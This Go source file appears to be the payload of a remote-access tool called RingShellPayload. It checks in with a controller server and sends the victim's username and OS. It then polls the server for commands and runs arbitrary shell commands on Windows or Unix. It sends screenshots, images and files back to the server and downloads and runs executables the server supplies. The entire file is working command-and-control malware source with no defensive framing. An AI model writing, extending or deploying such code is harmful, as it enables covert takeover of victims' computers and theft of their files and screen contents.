package Handler

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/MustafaAbdulazizHamza/RingShellPayload/Files"
	"github.com/MustafaAbdulazizHamza/RingShellPayload/Pics"
)

type ConnectRequest struct {
	OS       string `json:"os"`
	Username string `json:"username"`
}

type ConnectResponse struct {
	SessionID string `json:"session_id"`
}

type PollResponse struct {
	Command string `json:"command"`
}

type CommandResponse struct {
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

type UploadRequest struct {
	Filename string `json:"filename"`
	Content  string `json:"content"`
	Size     int64  `json:"size"`
}

type DownloadResponse struct {
	Filename string `json:"filename"`
	Content  string `json:"content"`
	Size     int64  `json:"size"`
	Error    string `json:"error,omitempty"`
}

func Handle(client *http.Client, baseURL string) error {
	usr, err := user.Current()
	if err != nil {
		return err
	}

	connectReq := ConnectRequest{
		OS:       runtime.GOOS,
		Username: usr.Username,
	}
	reqBody, _ := json.Marshal(connectReq)

	resp, err := client.Post(baseURL+"/connect", "application/json", bytes.NewReader(reqBody))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var connectResp ConnectResponse
	if err := json.NewDecoder(resp.Body).Decode(&connectResp); err != nil {
		return err
	}
	sessionID := connectResp.SessionID

	for {
		time.Sleep(2 * time.Second)

		pollResp, err := client.Get(fmt.Sprintf("%s/poll?session_id=%s", baseURL, sessionID))
		if err != nil {
			continue
		}

		var pollData PollResponse
		if err := json.NewDecoder(pollResp.Body).Decode(&pollData); err != nil {
			pollResp.Body.Close()
			continue
		}
		pollResp.Body.Close()

		if pollData.Command == "" {
			continue
		}

		cmd := strings.TrimSpace(pollData.Command)
		commands := parseCommand(cmd)

		var output string
		var cmdErr string

		if len(commands) == 0 {
			continue
		}

		if commands[0] == "get" {
			if len(commands) < 2 {
				cmdErr = "invalid get command"
			} else {
				switch commands[1] {
				case "screenshots":
					data, err := Pics.GetScreenshotsData()
					if err != nil {
						cmdErr = err.Error()
					} else {
						output = data
					}
				case "image":
					if len(commands) < 3 {
						cmdErr = "no image path specified"
					} else {
						var results []string
						for _, imageName := range commands[2:] {
							data, err := Pics.GetImageData(imageName)
							if err != nil {
								results = append(results, fmt.Sprintf("%s: %s", imageName, err.Error()))
							} else {
								results = append(results, fmt.Sprintf("%s: %s", imageName, data))
							}
						}
						output = strings.Join(results, "\n---\n")
					}
				case "file":
					if len(commands) < 3 {
						cmdErr = "no file path specified"
					} else {
						var results []string
						for _, fileName := range commands[2:] {
							data, err := Files.GetFileData(fileName)
							if err != nil {
								results = append(results, fmt.Sprintf("%s: error: %s", fileName, err.Error()))
							} else {
								results = append(results, fmt.Sprintf("%s: %s", fileName, data))
							}
						}
						output = strings.Join(results, "\n---\n")
					}
				default:
					cmdErr = "unknown get type"
				}
			}
		} else if commands[0] == "upload" {
			if len(commands) < 3 {
				cmdErr = "invalid upload command"
			} else {
				uploadType := commands[1]
				for _, fileName := range commands[2:] {
					if err := downloadFile(client, baseURL, sessionID, fileName); err != nil {
						cmdErr = err.Error()
						continue
					}
					if uploadType == "executable" {
						if err := executeFile(fileName); err != nil {
							cmdErr = err.Error()
						}
					}
				}
				if cmdErr == "" {
					output = "upload completed"
				}
			}
		} else {
			out := execute(commands)
			output = string(out)
		}

		cmdResponse := CommandResponse{
			Output: output,
			Error:  cmdErr,
		}
		respBody, _ := json.Marshal(cmdResponse)
		respReq, _ := http.NewRequest("POST", fmt.Sprintf("%s/response?session_id=%s", baseURL, sessionID), bytes.NewReader(respBody))
		respReq.Header.Set("Content-Type", "application/json")
		respResp, err := client.Do(respReq)
		if err != nil {
			continue
		}
		respResp.Body.Close()
	}
}

func downloadFile(client *http.Client, baseURL, sessionID, filename string) error {
	resp, err := client.Get(fmt.Sprintf("%s/download?session_id=%s&filename=%s", baseURL, sessionID, filename))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var dlResp DownloadResponse
	if err := json.NewDecoder(resp.Body).Decode(&dlResp); err != nil {
		return err
	}

	if dlResp.Error != "" {
		return fmt.Errorf(dlResp.Error)
	}

	content, err := base64.StdEncoding.DecodeString(dlResp.Content)
	if err != nil {
		return err
	}

	fi, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}
	defer fi.Close()

	_, err = fi.Write(content)
	return err
}

func parseCommand(cmd string) []string {
	var args []string
	var current strings.Builder
	inQuote := false
	
	for i := 0; i < len(cmd); i++ {
		c := cmd[i]
		
		if c == '"' {
			inQuote = !inQuote
		} else if c == ' ' && !inQuote {
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		} else {
			current.WriteByte(c)
		}
	}
	
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	
	return args
}

func execute(cmd []string) []byte {
	if len(cmd) >= 2 && cmd[0] == "cd" {
		targetDir := strings.Join(cmd[1:], " ")
		info, err := os.Stat(targetDir)
		if err != nil || !info.IsDir() {
			return []byte(fmt.Sprintf("Error, The directory %s was not found", targetDir))
		}
		if err := os.Chdir(targetDir); err != nil {
			return []byte(fmt.Sprint(err))
		}
		return []byte("done")
	} else {
		if runtime.GOOS == "windows" {
			command := exec.Command("cmd.exe", "/C", strings.Join(cmd, " "))
			out, err := command.CombinedOutput()
			if err != nil {
				if len(out) > 0 {
					return out
				}
				return []byte(fmt.Sprintf("Command failed: %s", err.Error()))
			}
			if out == nil || len(out) == 0 {
				out = []byte("No output returned.")
			}
			return out
		}
		command := exec.Command(cmd[0], cmd[1:]...)
		out, err := command.CombinedOutput()
		if err != nil {
			if len(out) > 0 {
				return out
			}
			return []byte(fmt.Sprintf("Command failed: %s", err.Error()))
		}
		if out == nil || len(out) == 0 {
			out = []byte("No output returned.")
		}
		return out
	}
}
